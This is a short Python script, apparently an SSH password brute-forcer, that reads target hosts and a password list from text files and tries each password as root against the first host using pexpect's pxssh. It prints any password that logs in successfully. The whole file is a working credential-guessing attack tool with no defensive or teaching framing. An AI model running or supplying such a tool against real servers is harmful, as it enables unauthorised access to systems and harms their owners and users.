#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pexpect import pxssh
import asyncio

user = 'root'
port = 22

with open('async_ip.txt', 'r') as f:
    hosts = [h.strip() for h in f.readlines()]
with open('pwd.txt', 'r') as f:
    password_list = [p.strip() for p in f.readlines()]


async def test_password(password):
    try:
        s = pxssh.pxssh()
        print("start test password: %s" % password)
        await asyncio.sleep(0)
        s.login(hosts[0], user, password, port=port)
        print('-----------------------------password is %s---------------------------' % password)
    except Exception as e:
        print(e)


async def test_host(password):
    await test_password(password)
    print("end test password: %s ..." % password)


if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    tasks = [test_host(password) for password in password_list]
    loop.run_until_complete(asyncio.wait(tasks))
    loop.close()
